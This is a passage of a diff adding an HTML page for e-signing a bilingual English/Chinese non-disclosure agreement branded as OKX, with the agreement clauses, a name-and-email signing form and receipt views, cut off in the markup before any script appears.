@@ -1,0 +1,1376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>NDA · Signature Required</title>
+  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABCGlDQ1BJQ0MgUHJvZmlsZQAAeJxjYGA8wQAELAYMDLl5JUVB7k4KEZFRCuwPGBiBEAwSk4sLGHADoKpv1yBqL+viUYcLcKakFicD6Q9ArFIEtBxopAiQLZIOYWuA2EkQtg2IXV5SUAJkB4DYRSFBzkB2CpCtkY7ETkJiJxcUgdT3ANk2uTmlyQh3M/Ck5oUGA2kOIJZhKGYIYnBncAL5H6IkfxEDg8VXBgbmCQixpJkMDNtbGRgkbiHEVBYwMPC3MDBsO48QQ4RJQWJRIliIBYiZ0tIYGD4tZ2DgjWRgEL7AwMAVDQsIHG5TALvNnSEfCNMZchhSgSKeDHkMyQx6QJYRgwGDIYMZAKbWPz9HbOBQAAADeElEQVR42u1aPU4rMRD+7PFupPDXwEko4A500MIZInEAKg7AHRAtabgDiUgLl0gVoYB22bFfNVbQ08N2lETRYyxtN7ue/WY8/r6xDYCAXzwsfvlQABQABUABUAAUAAXg9w6Xa0hEAABjDLqugzEm+Y4xBtZahBDAzGWRsTbO4b1P2ocQ4JyD9x7GmOz5TC4VJqL487nDGIMQNsu0q6pCCCHbT1fycWbG7e0tzs7O0LYtrLXJqDAzrq+v8fz8DGttMppic3Jygru7OziXdtF7j7qu8fT0hJubm6Rff/lZ8ry9vYXSMRgMAoDgnEt+X2wGg0HxPK+vrwFAMMZk/48rTef393d47+G9TyLNzLDWomma4lRumgbMDO99rD8/ZYC1FvP5fH1FUNYyEcUfz1kCUjtKhzEm/nhOSltri1Nft0EFQAFQABQABUDFUL44EXIjT2rfbdsWvV4PRAQiQlVV2VyeiMDMaJoGdV0niZDYi/haCwDMHAlKip0BiDx+NpuBmfH5+Zl8R0TMbDYDEaHf7xcpyBBC9HXlapCZcXp6iuPj4whG6p35fI7pdIrz8/OYMf+K0KJ6HA6HODw8xM7OTlLZScZMJhOMx+Po61rE0DLP/f19sbB5eHgIm/DNFVfNAs5dVRW+vr7QdR26rgMzJ5eO2DAznHPxGzlDRNpaiuCyk0j3SOpBjr4XG0n9kibMVm2Dm+4GKQ9QABQABUAB2CYAhClu826wViIk+7kcqOTQ00Ub51xSCG01ERICQ0RwzhWRIOdcZJBrzdJ1iiFrLT4+PjCdTnFxcVFEoIbDIY6OjtDv95OZsxExRETBGBMmk0mxsLm6uioWKZeXl8XzvLy8BGNMIKLViyHR2d77eGKTygBpiOzv74OIUNc1uq77sShWVYW2bXFwcFDcEBGfSuqAK1n7ktZy2pMqhtI8kQ6SKMOcQig/JR2llG/iV05gNs4DljkaUyKkACgACoACoABskRiSnr3s0TlkQ2yWUYOLc6W2UZlH6O9aToZk7O3tZStCsen1esUALB6p5c6zu7v7LVgrBUBo8OPjY/Y1OaHDo9HoW6RyojkejzEajYqvyQlDXfnRmES9RJ7m3AtMLbtSbl9VVdQrK18Cch0156psCCEeiCxzVVZuo+Vye5HEpYBnZ4BugwqAAqAAKAAKgAKgACgA/9n4A9TZbyNKoNxHAAAAAElFTkSuQmCC" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    :root {
+      --bg: #000000;
+      --surface: #0E0E0E;
+      --surface-2: #161616;
+      --border: #232323;
+      --border-strong: #3A3A3A;
+      --text: #FFFFFF;
+      --text-2: #B8B8B8;
+      --text-3: #7A7A7A;
+      --text-4: #4E4E4E;
+      --accent: #FFFFFF;
+      --accent-hover: #E5E5E5;
+      --success: #00D69E;
+      --danger: #F6465D;
+      --warn: #F0B90B;
+      --sans: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", Arial, sans-serif;
+      --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; background: var(--bg); }
+
+    body {
+      font-family: var(--sans);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.55;
+      font-size: 14px;
+      font-weight: 400;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      min-height: 100vh;
+      letter-spacing: -0.005em;
+    }
+
+    .page {
+      max-width: 760px;
+      margin: 0 auto;
+      padding: 32px 24px 80px;
+    }
+
+    /* ==================== HEADER ==================== */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 0 20px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 40px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .brand-logo {
+      height: 24px;
+      width: auto;
+      display: block;
+    }
+
+    .brand-divider {
+      width: 1px;
+      height: 16px;
+      background: var(--border-strong);
+    }
+
+    .brand-label {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-3);
+      letter-spacing: 0.04em;
+    }
+
+    .lang-toggle {
+      display: flex;
+      gap: 0;
+      border: 1px solid var(--border-strong);
+      border-radius: 0;
+      overflow: hidden;
+    }
+
+    .lang-btn {
+      font-family: var(--sans);
+      font-size: 12px;
+      font-weight: 500;
+      padding: 6px 14px;
+      border: none;
+      background: transparent;
+      cursor: pointer;
+      color: var(--text-2);
+      transition: all 0.15s ease;
+      letter-spacing: 0;
+    }
+
+    .lang-btn:not(:last-child) {
+      border-right: 1px solid var(--border-strong);
+    }
+
+    .lang-btn:hover { color: var(--text); }
+
+    .lang-btn.active {
+      background: var(--text);
+      color: var(--bg);
+    }
+
+    /* ==================== TITLE BLOCK ==================== */
+    .title-block {
+      margin-bottom: 32px;
+    }
+
+    .eyebrow {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-3);
+      letter-spacing: 0.04em;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .eyebrow::before {
+      content: '';
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      background: var(--success);
+      border-radius: 50%;
+    }
+
+    h1.title {
+      font-family: var(--sans);
+      font-weight: 600;
+      font-size: clamp(28px, 4vw, 38px);
+      line-height: 1.1;
+      letter-spacing: -0.025em;
+      margin-bottom: 12px;
+      color: var(--text);
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: var(--text-2);
+      max-width: 560px;
+      line-height: 1.55;
+    }
+
+    /* ==================== PARTIES STRIP ==================== */
+    .parties-strip {
+      margin: 28px 0 32px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+    }
+
+    .party {
+      background: var(--surface);
+      padding: 16px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .party-role {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-3);
+      letter-spacing: 0.04em;
+    }
+
+    .party-name {
+      font-size: 14px;
+      color: var(--text);
+      font-weight: 500;
+    }
+
+    /* ==================== AGREEMENT ==================== */
+    .agreement {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 28px 32px 24px;
+      margin-bottom: 24px;
+    }
+
+    .agreement-meta {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-3);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      padding-bottom: 16px;
+      margin-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .agreement-meta .doc-id {
+      color: var(--text-2);
+    }
+
+    .clause {
+      margin-bottom: 20px;
+    }
+
+    .clause:last-child { margin-bottom: 0; }
+
+    .clause-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-3);
+      letter-spacing: 0.04em;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .clause h3 {
+      font-family: var(--sans);
+      font-weight: 600;
+      font-size: 15px;
+      line-height: 1.4;
+      margin-bottom: 8px;
+      color: var(--text);
+      letter-spacing: -0.005em;
+    }
+
+    .clause p {
+      font-size: 13.5px;
+      line-height: 1.65;
+      color: var(--text-2);
+      margin-bottom: 8px;
+    }
+
+    .clause ol, .clause ul {
+      padding-left: 18px;
+      margin-bottom: 8px;
+    }
+
+    .clause li {
+      font-size: 13.5px;
+      line-height: 1.65;
+      margin-bottom: 4px;
+      color: var(--text-2);
+    }
+
+    .clause strong {
+      font-weight: 500;
+      color: var(--text);
+    }
+
+    [lang="zh-CN"] .clause p,
+    [lang="zh-CN"] .clause li {
+      line-height: 1.75;
+    }
+
+    .lang-content { display: none; }
+    .lang-content.active { display: block; animation: fadeIn 0.2s ease-out; }
+
+    /* ==================== SIGNATURE FORM ==================== */
+    .signature-section {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 28px 32px;
+    }
+
+    .sig-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-bottom: 16px;
+      margin-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .sig-title {
+      font-family: var(--sans);
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text);
+      letter-spacing: -0.005em;
+    }
+
+    .sig-status {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-3);
+      letter-spacing: 0.04em;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    .field label {
+      display: block;
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-3);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--border-strong);
+      background: var(--bg);
+      font-family: var(--sans);
+      font-size: 14px;
+      font-weight: 400;
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.15s ease, background 0.15s ease;
+      border-radius: 0;
+      letter-spacing: -0.005em;
+    }
+
+    .field input::placeholder {
+      color: var(--text-4);
+    }
+
+    .field input:hover {
+      border-color: var(--text-3);
+    }
+
+    .field input:focus {
+      border-color: var(--text);
+      background: var(--surface-2);
+    }
+
+    .field input.invalid {
+      border-color: var(--danger);
+    }
+
+    .field input.invalid:focus {
+      border-color: var(--danger);
+    }
+
+    .field-error {
+      display: none;
+      margin-top: 6px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--danger);
+      letter-spacing: 0.02em;
+      line-height: 1.4;
+    }
+
+    .field-error.show {
+      display: block;
+    }
+
+    .checkbox-field {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 16px;
+      margin: 6px 0 20px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+    }
+
+    .checkbox-field input[type="checkbox"] {
+      margin-top: 2px;
+      width: 14px;
+      height: 14px;
+      accent-color: var(--text);
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .checkbox-field label {
+      font-size: 13px;
+      color: var(--text-2);
+      cursor: pointer;
+      line-height: 1.55;
+      font-family: var(--sans);
+      letter-spacing: 0;
+      text-transform: none;
+      font-weight: 400;
+    }
+
+    .sign-btn {
+      width: 100%;
+      padding: 14px;
+      background: var(--text);
+      color: var(--bg);
+      border: none;
+      font-family: var(--sans);
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: -0.005em;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      border-radius: 0;
+    }
+
+    .sign-btn:hover:not(:disabled) {
+      background: var(--accent-hover);
+    }
+
+    .sign-btn:active:not(:disabled) {
+      transform: translateY(1px);
+    }
+
+    .sign-btn:disabled {
+      background: var(--border);
+      color: var(--text-4);
+      cursor: not-allowed;
+    }
+
+    .doc-meta {
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-3);
+      letter-spacing: 0.02em;
+    }
+
+    .doc-meta strong {
+      color: var(--text-2);
+      font-weight: 400;
+    }
+
+    /* ==================== STATE CARDS ==================== */
+    .state-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 48px 32px 36px;
+      text-align: center;
+    }
+
+    .state-icon {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto 20px;
+      border: 1px solid var(--success);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: stampIn 0.4s ease-out backwards;
+    }
+
+    .state-icon svg {
+      width: 24px;
+      height: 24px;
+      stroke: var(--success);
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .state-card.error .state-icon {
+      border-color: var(--warn);
+    }
+
+    .state-card.error .state-icon svg {
+      stroke: var(--warn);
+    }
+
+    @keyframes stampIn {
+      0% { transform: scale(0.6); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .state-title {
+      font-family: var(--sans);
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: var(--text);
+      letter-spacing: -0.015em;
+    }
+
+    .state-subtitle {
+      color: var(--text-2);
+      font-size: 13.5px;
+      margin-bottom: 32px;
+      max-width: 440px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.55;
+    }
+
+    .receipt {
+      text-align: left;
+      max-width: 480px;
+      margin: 0 auto 28px;
+      padding: 20px 22px;
+      border: 1px solid var(--border);
+      background: var(--bg);
+    }
+
+    .receipt-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 12px;
+      margin-bottom: 12px;
+      border-bottom: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-3);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .receipt-header .status-dot {
+      width: 6px;
+      height: 6px;
+      background: var(--success);
+      border-radius: 50%;
+      display: inline-block;
+      margin-right: 6px;
+    }
+
+    .receipt-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 8px 0;
+      font-size: 12.5px;
+      gap: 16px;
+    }
+
+    .receipt-row + .receipt-row {
+      border-top: 1px dashed var(--border);
+    }
+
+    .receipt-label {
+      font-family: var(--mono);
+      color: var(--text-3);
+      letter-spacing: 0.02em;
+      font-size: 11px;
+      flex-shrink: 0;
+      padding-top: 2px;
+    }
+
+    .receipt-value {
+      font-family: var(--sans);
+      color: var(--text);
+      font-weight: 500;
+      text-align: right;
+      word-break: break-all;
+    }
+
+    .receipt-value.mono {
+      font-family: var(--mono);
+      font-size: 11px;
+      font-weight: 400;
+      color: var(--text-2);
+    }
+
+    .download-btn {
+      padding: 10px 22px;
+      background: transparent;
+      color: var(--text);
+      border: 1px solid var(--border-strong);
+      font-family: var(--sans);
+      font-size: 13px;
+      font-weight: 500;
+      letter-spacing: 0;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      border-radius: 0;
+    }
+
+    .download-btn:hover {
+      background: var(--surface-2);
+      border-color: var(--text);
+    }
+
+    /* ==================== ANIMATIONS ==================== */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .fade-in { animation: fadeIn 0.3s ease-out; }
+
+    /* ==================== MOBILE ==================== */
+    @media (max-width: 640px) {
+      .page { padding: 20px 14px 60px; }
+      .header { margin-bottom: 28px; }
+      .agreement { padding: 22px 18px 20px; }
+      .signature-section { padding: 22px 18px; }
+      .state-card { padding: 36px 20px 24px; }
+      .state-title { font-size: 20px; }
+      .parties-strip {
+        grid-template-columns: 1fr;
+      }
+      .doc-meta { flex-direction: column; gap: 6px; }
+      .receipt { padding: 16px; }
+      .receipt-row {
+        flex-direction: column;
+        gap: 2px;
+      }
+      .receipt-value { text-align: left; }
+    }
+
+    @media print {
+      :root {
+        --bg: #ffffff;
+        --surface: #ffffff;
+        --surface-2: #ffffff;
+        --text: #000000;
+        --text-2: #333333;
+        --text-3: #666666;
+        --text-4: #999999;
+        --border: #cccccc;
+        --border-strong: #999999;
+      }
+      .lang-toggle, .sign-btn, .download-btn { display: none; }
+      .page { padding: 0; }
+    }
+
+    *:focus-visible {
+      outline: 2px solid var(--text);
+      outline-offset: 2px;
+    }
+    button:focus-visible, input:focus-visible {
+      outline: 1px solid var(--text);
+      outline-offset: 1px;
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <header class="header">
+      <div class="brand">
+        <img class="brand-logo" alt="OKX" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKQAAABICAQAAADSOpYzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAAFiUAABYlAUlSJPAAAAAHdElNRQfmBwMNKhI4Vg/yAAABMklEQVR42u3aQW6DMBBAUZyT5eSFE/RInS5psOKx8Scq0n9ZNXjA+VE3VpZFkiRJkiShYo0rrYPPWyf3+3VYXZL138nTuudLxLVfVCmHrcXY+uqjteejPF7/XH5G1teXe+ebt1E/Q0IMCTEkxJAQQ0IMCTEkxJAQQ0IMCTEkxJCQ+4XcBq+Orj87n54oPlv3iWc2Xk3A55tzZs8rd+l55OT54PB5ZLrhMjd/2M3keeXufv/a/5QhIYaEGBJiSIghIYaEGBJiSIghIYaEGBJiSEgaMjtG+/B+tw/f8eVqlPq1X7xYlX5wfTXfPj/095Hv1tdfRPLJ/X3kvRkSYkiIISGGhBgSYkiIISGGhBgSYkiIISGGhDwuOOH7a+t4p//qmflticYrf946OS9JkiRJkk75BUgSur6QrNyYAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIyLTA3LTAzVDEzOjQyOjE4KzAwOjAwKpbwNQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMi0wNy0wM1QxMzo0MjoxOCswMDowMFvLSIkAAAAASUVORK5CYII=" />
+        <div class="brand-divider"></div>
+        <div class="brand-label" data-i18n="docLabel">Non-Disclosure Agreement</div>
+      </div>
+      <div class="lang-toggle" role="group" aria-label="Language">
+        <button class="lang-btn active" data-lang="en" aria-pressed="true">EN</button>
+        <button class="lang-btn" data-lang="zh" aria-pressed="false">中文</button>
+      </div>
+    </header>
+
+    <main id="main-view">
+      <section class="title-block">
+        <div class="eyebrow" data-i18n="eyebrow">Confidential · Signature required</div>
+        <h1 class="title" data-i18n="title">Non-Disclosure Agreement</h1>
+        <p class="subtitle" data-i18n="subtitle">
+          Please review the Agreement below. Your signature constitutes acceptance of and agreement to be bound by its terms.
+        </p>
+
+        <span id="disclosing-name" style="display:none;">OKX</span>
+      </section>
+
+      <section class="agreement">
+        <div class="agreement-meta">
+          <span data-i18n="agreementMeta">Terms of Agreement</span>
+          <span class="doc-id">NDA</span>
+        </div>
+
+        <div id="agreement-en" class="lang-content active">
+          <div class="clause">
+            <span class="clause-num">01</span>
+            <h3>Confidential Information</h3>
+            <p>"<strong>Confidential Information</strong>" means information disclosed by the Disclosing Party in any form in connection with discussions of a potential cooperation (the "<strong>Project</strong>"), including without limitation:</p>
+            <ol type="a">
+              <li>the existence, objectives, scope, business model, and implementation plan of the Project;</li>
+              <li>the fact that the Parties are in discussions regarding the Project;</li>
+              <li>the Disclosing Party's technical solutions, business strategies, product plans, financial data, user information, and counterparty information;</li>
+              <li>any information marked "Confidential" or reasonably understood to be confidential by its nature.</li>
+            </ol>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">02</span>
+            <h3>Obligations</h3>
+            <p>The Receiving Party shall:</p>
+            <ol type="a">
+              <li>hold Confidential Information in strict confidence, using at least the same standard of care as it uses to protect its own confidential information of similar importance, but acting no less than reasonably prudently;</li>
+              <li>use Confidential Information solely for the purpose of evaluating and discussing the Project;</li>
+              <li>not disclose Confidential Information to any third party; and</li>
+              <li>disclose Confidential Information only on a strict need-to-know basis to its employees, Affiliates, and professional advisors (including legal, accounting, and financial advisors) who are bound by equivalent confidentiality obligations.</li>
+            </ol>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">03</span>
+            <h3>Exceptions</h3>
+            <p>The obligations under this Agreement do not apply to information that:</p>
+            <ol type="a">
+              <li>is publicly known at the time of disclosure or subsequently becomes publicly known through no fault of the Receiving Party;</li>
+              <li>was lawfully in the Receiving Party's possession prior to disclosure, free of any confidentiality obligation;</li>
+              <li>is lawfully received from a third party having the right to disclose;</li>
+              <li>was independently developed by the Receiving Party; or</li>
+              <li>is required to be disclosed by law, regulation, or order of a governmental authority (provided the Receiving Party, to the extent legally permissible, gives the Disclosing Party prior notice).</li>
+            </ol>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">04</span>
+            <h3>Term</h3>
+            <p>This Agreement takes effect upon execution by the Receiving Party, and the confidentiality obligations remain in force for <strong>twelve (12) months</strong> thereafter.</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">05</span>
+            <h3>Destruction</h3>
+            <p>Upon the Disclosing Party's written request or termination of discussions regarding the Project, the Receiving Party shall, within <strong>ten (10) business days</strong>, destroy all Confidential Information in its possession (including copies, electronic versions, and derivative materials) and confirm such destruction in writing. Copies retained as required by law, or retained on automated backup systems where individual deletion is not reasonably practicable, shall remain subject to this Agreement.</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">06</span>
+            <h3>No Grant of Rights</h3>
+            <p>This Agreement does not grant the Receiving Party any intellectual property, license, or other right in or to the Confidential Information. This Agreement does not obligate either Party to continue discussions or to enter into any definitive agreement.</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">07</span>
+            <h3>Remedies</h3>
+            <p>In the event of a breach, the Receiving Party shall immediately cease the breach and indemnify the Disclosing Party for actual losses suffered (including reasonable legal fees). Given that monetary damages may not adequately compensate for the harm caused by a breach, the Disclosing Party may seek injunctive relief from any court or arbitral tribunal of competent jurisdiction without the need to post a bond.</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">08</span>
+            <h3>Governing Law &amp; Dispute Resolution</h3>
+            <p>This Agreement shall be governed by the laws of <strong>Singapore</strong>. Any dispute arising out of or in connection with this Agreement shall be finally resolved by arbitration administered by the <strong>Singapore International Arbitration Centre (SIAC)</strong> in accordance with its Arbitration Rules then in force. The seat of arbitration shall be <strong>Singapore</strong>, the language of the arbitration shall be <strong>English</strong>, and the tribunal shall consist of <strong>one (1)</strong> arbitrator.</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">09</span>
+            <h3>Miscellaneous</h3>
+            <p>This Agreement constitutes the entire agreement of the Parties with respect to confidentiality for the Project. <strong>Electronic execution shall have the same legal effect as paper execution</strong>. This Agreement is made in English and Chinese; in case of inconsistency, the English version shall prevail.</p>
+          </div>
+        </div>
+
+        <div id="agreement-zh" class="lang-content" lang="zh-CN">
+          <div class="clause">
+            <span class="clause-num">01</span>
+            <h3>保密信息</h3>
+            <p>"<strong>保密信息</strong>"指在双方就一项潜在合作（"<strong>本项目</strong>"）进行讨论期间，披露方以任何形式向接收方披露的信息，包括但不限于：</p>
+            <ol type="a">
+              <li>本项目的存在、目标、范围、商业模式及实施计划；</li>
+              <li>双方就本项目进行洽谈的事实本身；</li>
+              <li>披露方的技术方案、业务策略、产品规划、财务数据、用户信息、合作方信息；</li>
+              <li>任何标注为"保密"或依其性质合理可知为保密的信息。</li>
+            </ol>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">02</span>
+            <h3>保密义务</h3>
+            <p>接收方应：</p>
+            <ol type="a">
+              <li>对保密信息严格保密，所采取的保密措施不得低于其保护自身同等重要信息时所采取的合理审慎标准；</li>
+              <li>仅将保密信息用于评估、洽谈本项目；</li>
+              <li>不向任何第三方披露保密信息；</li>
+              <li>仅在严格必要知悉原则下，向因评估本项目确需了解保密信息的员工、关联方及承担同等保密义务的专业顾问（包括律师、会计师、财务顾问）披露。</li>
+            </ol>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">03</span>
+            <h3>例外情形</h3>
+            <p>下列情形不构成违反本协议：</p>
+            <ol type="a">
+              <li>在披露时已为公众所知悉，或在披露后非因接收方过错而为公众所知悉的信息；</li>
+              <li>接收方在披露前已合法持有且不负保密义务的信息；</li>
+              <li>接收方从有权披露的第三方处合法获得的信息；</li>
+              <li>接收方独立开发取得的信息；</li>
+              <li>因法律、监管机关或政府机关的强制要求而披露的信息（接收方应在法律允许范围内事先通知披露方）。</li>
+            </ol>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">04</span>
+            <h3>期限</h3>
+            <p>本协议自接收方签署之日起生效，保密义务的有效期为 <strong>十二（12）个月</strong>。</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">05</span>
+            <h3>信息销毁</h3>
+            <p>在披露方书面要求或本项目讨论终止后，接收方应在 <strong>十（10）个工作日</strong> 内销毁所持有的全部保密信息（含复印件、电子副本及衍生材料），并书面确认销毁完毕。因法律要求而保留，或留存于自动备份系统中难以单独删除的副本，仍受本协议约束。</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">06</span>
+            <h3>不授予权利</h3>
+            <p>本协议不向接收方授予披露方所拥有的任何知识产权、许可或其他权利。本协议亦不构成任何一方继续洽谈或签订后续正式合作协议的义务。</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">07</span>
+            <h3>违约责任</h3>
+            <p>接收方违反本协议的，应立即停止违约行为，并赔偿披露方因此遭受的实际损失（包括合理的律师费用）。鉴于违约所造成的损害可能难以仅通过金钱赔偿予以充分弥补，披露方有权向有管辖权的法院或仲裁庭申请禁令救济，且无需提供担保。</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">08</span>
+            <h3>适用法律与争议解决</h3>
+            <p>本协议适用 <strong>新加坡</strong> 法律。因本协议引起的或与本协议相关的任何争议，应提交 <strong>新加坡国际仲裁中心（SIAC）</strong> 按其届时有效的仲裁规则进行最终仲裁。仲裁地为 <strong>新加坡</strong>，仲裁语言为 <strong>英文</strong>，由 <strong>一（1）名</strong> 仲裁员审理。</p>
+          </div>
+
+          <div class="clause">
+            <span class="clause-num">09</span>
+            <h3>其他</h3>
+            <p>本协议构成双方就本项目保密事宜达成的完整协议。<strong>本协议的电子签署与纸质签署具有同等法律效力</strong>。本协议以中、英两种语言订立，如中英文版本存在不一致之处，应以英文版本为准。</p>
+          </div>
+        </div>
+      </section>
+
+      <section class="signature-section">
+        <div class="sig-header">
+          <div class="sig-title" data-i18n="sigTitle">Sign Agreement</div>
+          <div class="sig-status" data-i18n="sigStatus">PENDING SIGNATURE</div>
+        </div>
+
+        <div class="field">
+          <label for="email" data-i18n="lblEmail">Email Address</label>
+          <input type="email" id="email" autocomplete="email" placeholder="name@company.com" required />
+          <div class="field-error" id="email-error" data-i18n="emailError">Please enter a valid email address (e.g. name@company.com)</div>
+        </div>
+
+        <div class="field">
+          <label for="name" data-i18n="lblName">Full Legal Name</label>
+          <input type="text" id="name" autocomplete="name" placeholder="Your full legal name" required />
+        </div>
+
+        <div class="checkbox-field">
+          <input type="checkbox" id="agree" required />
+          <label for="agree" data-i18n="lblAgree">
+            I have read and understood the Agreement above, and I agree to be bound by its terms. I confirm that I am authorized to sign on behalf of the entity I represent.
+          </label>
+        </div>
+
+        <button class="sign-btn" id="sign-btn" disabled>
+          <span data-i18n="btnText">Sign</span>
+        </button>
+      </section>
+    </main>
+
+    <div id="success-view" class="state-card" style="display:none;">
+      <div class="state-icon">
+        <svg viewBox="0 0 24 24"><polyline points="4 12 10 18 20 6"></polyline></svg>
+      </div>
+      <h2 class="state-title" data-i18n="successTitle">Agreement Signed</h2>
+      <p class="state-subtitle" data-i18n="successSubtitle">
+        The Agreement has been executed. A digital receipt has been recorded below.
+      </p>
+
+      <div class="receipt">
+        <div class="receipt-header">
+          <span><span class="status-dot"></span><span data-i18n="receiptStatus">EXECUTED</span></span>
+          <span data-i18n="receiptId">Receipt</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rSigner">Signed by</span>
+          <span class="receipt-value" id="r-signer-val">—</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rEmail">Email</span>
+          <span class="receipt-value" id="r-email-val">—</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rTimestamp">Timestamp</span>
+          <span class="receipt-value mono" id="r-timestamp-val">—</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rToken">Token</span>
+          <span class="receipt-value mono" id="r-token-val">—</span>
+        </div>
+        <div class="receipt-row">
+          <span class="receipt-label" data-i18n="rFingerprint">Fingerprint</span>
+          <span class="receipt-value mono" id="r-fingerprint-val">—</span>
+        </div>
+      </div>
+
+      <button class="download-btn" id="download-btn" data-i18n="downloadBtn">
+        Download Signed Copy
+      </button>
+    </div>
+
+    <div id="invalid-view" class="state-card error" style="display:none;">
+      <div class="state-icon">
+        <svg viewBox="0 0 24 24"><line x1="12" y1="6" x2="12" y2="14"></line><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+      </div>
+      <h2 class="state-title" data-i18n="invalidTitle">Invalid Signing Link</h2>
+      <p class="state-subtitle" data-i18n="invalidSubtitle">
+        This link does not contain a valid signing token. Please contact the sender for a new link.
+      </p>
+    </div>
+
+    <div id="used-view" class="state-card error" style="display:none;">
+      <div class="state-icon">
